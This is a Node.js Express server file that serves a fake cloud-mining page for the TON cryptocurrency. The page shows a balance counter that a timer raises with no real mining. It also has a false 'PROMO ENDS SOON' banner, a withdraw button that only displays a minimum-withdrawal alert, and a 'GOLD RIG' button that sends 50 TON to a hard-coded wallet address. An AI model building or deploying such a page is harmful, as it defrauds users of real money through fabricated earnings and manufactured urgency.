const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TON Cloud Mining Pro</title>
    <style>
        :root { --ton-blue: #0088cc; --bg: #0a0d12; --card: #1c2128; --green: #3fb950; }
        body { background: var(--bg); color: white; font-family: sans-serif; margin: 0; padding-bottom: 80px; }
        @keyframes flash { 0% { filter: drop-shadow(0 0 5px var(--ton-blue)); } 50% { filter: drop-shadow(0 0 20px var(--ton-blue)); } 100% { filter: drop-shadow(0 0 5px var(--ton-blue)); } }
        .main-logo { width: 65px; margin: 20px auto; display: block; animation: flash 1.5s infinite; }
        .card { background: var(--card); border-radius: 20px; padding: 20px; border: 1px solid #30363d; margin: 15px; text-align: center; }
        #balance { font-size: 35px; color: var(--green); font-family: monospace; margin: 10px 0; }
        .btn-action { background: var(--ton-blue); border: none; color: white; padding: 15px; width: 90%; border-radius: 12px; font-weight: bold; cursor: pointer; }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: #161b22; display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #30363d; }
    </style>
</head>
<body>
    <div style="background: #ff3e3e; padding: 10px; text-align: center; font-size: 13px; font-weight: bold;">PROMO ENDS SOON!</div>
    <img src="https://cryptologos.cc/logos/toncoin-ton-logo.png" class="main-logo">
    
    <div class="card">
        <small style="color: #8b949e;">Live TON Balance</small>
        <div id="balance">0.00000000</div>
        <button class="btn-action" onclick="alert('Min withdrawal 5 TON')">WITHDRAW NOW</button>
    </div>

    <div style="padding: 0 15px;">
        <h3 style="color: #58a6ff;">Mining Rigs</h3>
        <div class="card" style="display: flex; justify-content: space-between; align-items: center; margin: 10px 0;">
            <div style="text-align: left;"><b style="color: #ffd700;">GOLD RIG</b><br><small>+5.0 TON Daily</small></div>
            <button onclick="window.location.href='ton://transfer/UQBufh6lLHE5H1NDJXQwRIVCX-t4iKHyyoXD0Spm8N9navPx?amount=50000000000'" style="background: var(--green); border:none; color:white; padding:10px; border-radius:8px;">50 TON</button>
        </div>
    </div>

    <nav class="nav-bar">
        <div style="color: var(--ton-blue);">Mining</div>
        <div style="color: #8b949e;">History</div>
        <div style="color: #8b949e;">Support</div>
    </nav>

    <script>
        let bal = 0;
        setInterval(() => { bal += 0.00000045; document.getElementById('balance').innerText = bal.toFixed(8); }, 100);
    </script>
</body>
</html>
    `);
});

app.listen(PORT, () => {
    console.log("Server is running...");
});
